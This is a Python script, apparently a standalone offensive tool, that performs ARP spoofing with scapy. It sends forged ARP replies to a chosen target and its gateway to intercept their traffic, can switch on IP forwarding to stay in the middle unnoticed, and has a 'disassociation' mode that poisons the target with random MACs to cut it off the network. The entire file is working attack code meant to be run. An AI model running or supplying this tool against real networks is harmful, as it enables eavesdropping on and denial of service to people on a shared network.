#!/usr/bin/env python3

import argparse
import scapy.all as scapy
import netifaces
import random
import time
import datetime
import sys
import queue
import threading
from colorama import Fore, init

print_stmt = queue.Queue()
log_stmt = queue.Queue()

def output():
		while True:
				msg=print_stmt.get()
				if(msg=="Exit"):
					break
				print(msg)
				sys.stdout.flush()

def log():
		with open("arp_spoofer_log.txt", "a" ) as f:
			f.write(f"-------- Arp_spoofer started at {datetime.datetime.now()}\n")
			while True:
					msg=log_stmt.get()
					if(msg=="Exit"):
						break
					f.write(msg+"\n")
					f.flush()
			f.write("\n")

class ArpSpoofer:
		def __init__(self, args):
				init(autoreset=True)  # Initialize colorama
				self.target_ip = args.target
				# Use provided gateway or get router IP if not provided.
				self.gateway_ip = args.gateway if args.gateway is not None else self.get_router_ip()
				# Use provided interface or get the active interface.
				self.interface = args.interface if args.interface is not None else self.get_active_interface()
				self.time_interval = args.time_interval if args.time_interval is not None else 10
				self.disassociate_flag = args.disassociate
				self.ipforward = args.ipforward

				self.target_mac = self.get_mac(self.target_ip)
				self.gateway_mac = self.get_mac(self.gateway_ip)
				self.attacker_ip, self.attacker_mac = self.get_attacker_info(self.interface)

				print_stmt.put(Fore.CYAN + f"[+] Interface: {self.interface}")
				print_stmt.put(Fore.CYAN + f"[+] Target IP: {self.target_ip}")
				print_stmt.put(Fore.CYAN + f"[+] Gateway IP: {self.gateway_ip}")
				print_stmt.put(Fore.CYAN + f"[+] Target MAC: {self.target_mac}")
				print_stmt.put(Fore.CYAN + f"[+] Gateway MAC: {self.gateway_mac}")
				print_stmt.put(Fore.CYAN + f"[+] Attacker IP: {self.attacker_ip}")
				print_stmt.put(Fore.CYAN + f"[+] Attacker MAC: {self.attacker_mac}")
				print_stmt.put(Fore.CYAN + f"[+] Time interval: {self.time_interval}")
				print_stmt.put(Fore.CYAN + "[+] IP Forwarding: {0}".format( "Enabled" if self.ipforward else "Disabled"))
				print_stmt.put(Fore.CYAN + "[+] Disassociation Mode: {0}".format("Enabled" if self.disassociate_flag else "Disabled"))

				if self.ipforward:
						self.enable_ip_forward()

		def get_active_interface(self):
				gateways = netifaces.gateways()
				default_gateway = gateways.get('default', {})
				if netifaces.AF_INET in default_gateway:
						return default_gateway[netifaces.AF_INET][1]
				return None

		def get_router_ip(self):
				gateways = netifaces.gateways()
				default_gateway = gateways.get('default', {})
				if netifaces.AF_INET in default_gateway:
						return default_gateway[netifaces.AF_INET][0]
				return None

		def get_mac(self, ip):
				request = scapy.ARP(pdst=ip)
				broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
				packet = broadcast / request
				ans, _ = scapy.srp(packet, iface=self.interface, timeout=2, verbose=False)
				if ans:
						return ans[0][1].hwsrc
				return None

		def get_attacker_info(self, iface):
				try:
						addrs = netifaces.ifaddresses(iface)
						# Get IPv4 address
						ip_info = addrs.get(netifaces.AF_INET, [{}])[0]
						attacker_ip = ip_info.get('addr')
						# Get MAC address
						mac_info = addrs.get(netifaces.AF_LINK, [{}])[0]
						attacker_mac = mac_info.get('addr')
						return attacker_ip, attacker_mac
				except Exception as e:
						print_stmt.put(Fore.RED + f"[!] Error retrieving attacker info on interface {iface} : {e}")
						log_stmt.put(f"{datetime.datetime.now()} Error retrieving attacker info on interface {iface} : {e}")
						return None, None

		def spoof(self,t_ip,t_mac,send_ip,send_mac):
				reply = scapy.ARP(op=2, pdst=t_ip, hwdst=t_mac, psrc=send_ip,hwsrc=send_mac)
				packet=scapy.Ether(dst=t_mac)/reply
				scapy.sendp(packet, iface=self.interface, verbose=False)
				print_stmt.put(Fore.YELLOW + f"[+] Sent ARP reply to {self.target_ip} spoofing as {self.gateway_ip}")
				log_stmt.put(f"{datetime.datetime.now()} {self.gateway_ip} Sent ARP reply to {self.target_ip} spoofing as {self.gateway_ip}")

		def restore(self,t_ip,t_mac,send_ip,send_mac):
				reply = scapy.ARP(op=2, pdst=t_ip, hwdst=t_mac, psrc=send_ip, hwsrc=send_mac)
				packet=scapy.Ether(dst=t_mac)/reply
				scapy.sendp(packet, iface=self.interface, count=5, verbose=False)
				print_stmt.put(Fore.GREEN + f"[+] Restored ARP table for {t_ip}")
				log_stmt.put(f"{datetime.datetime.now()}  Restored ARP table for {t_ip}")

		def enable_ip_forward(self):
				with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
						f.write("1")
				print_stmt.put(Fore.MAGENTA + "[+] IP forwarding enabled")
				log_stmt.put(f"{datetime.datetime.now()}  IP forwarding enabled")

		def disable_ip_forward(self):
				with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
						f.write("0")
				print_stmt.put(Fore.GREEN + "[+] IP forwarding disabled")
				log_stmt.put(f"{datetime.datetime.now()}  IP forwarding disabled")

		def random_mac_gen(self):
				hexchars = "ABCDEF01234567"
				return ":".join(''.join(random.choices(hexchars, k=2)) for _ in range(6))

		def disassociate(self):
				rand_mac = self.random_mac_gen()
				packet = scapy.ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac, psrc=self.gateway_ip, hwsrc=rand_mac)
				scapy.send(packet, iface=self.interface, verbose=False)
				print_stmt.put(Fore.RED + f"[+] Sent disassociation packet with random MAC {rand_mac}")
				log_stmt.put(f"{datetime.datetime.now()} Sent disassociation packet with random MAC {rand_mac}")

		def execute(self):
				try:
						while True:
								if self.disassociate_flag:
										self.disassociate()
								else:
										self.spoof(self.target_ip,self.target_mac,self.gateway_ip,self.attacker_mac)
										self.spoof(self.gateway_ip,self.gateway_mac,self.target_ip,self.attacker_mac)
								time.sleep(self.time_interval)
				except KeyboardInterrupt:
						print_stmt.put(Fore.RED + "[!] Detected CTRL+C, restoring ARP tables...")
						log_stmt.put(f"{datetime.datetime.now()} Detected CTRL+C, restoring ARP tables...")

						self.restore(self.target_ip,self.target_mac,self.gateway_ip,self.gateway_mac)
						self.restore(self.gateway_ip,self.gateway_mac,self.target_ip,self.target_mac)
						self.disable_ip_forward()

						print_stmt.put(Fore.GREEN + "[+] ARP tables restored, exiting.")
						log_stmt.put(f"{datetime.datetime.now()} ARP tables restored, exiting.")

if __name__ == "__main__":
		parser = argparse.ArgumentParser(description="ARP Spoofing Tool")
		parser.add_argument("-t", "--target", required=True, help="Target IP address to spoof")
		parser.add_argument("-s", "--gateway", required=False, help="Router IP address to spoof (usually the gateway)")
		parser.add_argument("-ti", "--time_interval", required=False, help="time interval between sending packets (int or float) (default 10 seconds)")
		parser.add_argument("-i", "--interface", required=False, help="Network interface (e.g., eth0, wlan0)")
		parser.add_argument("-d", "--disassociate", action="store_true", help="Enable disassociation attack (random MAC)")
		parser.add_argument("-ipf", "--ipforward", action="store_true", help="Enable IP forwarding to maintain victim-router connection")
		args = parser.parse_args()

		threading.Thread(target=output,daemon=True).start()
		threading.Thread(target=log,daemon=True).start()

		spoofer = ArpSpoofer(args)
		spoofer.execute()

		print_stmt.put("Exit")
		log_stmt.put("Exit")
		time.sleep(0.5)
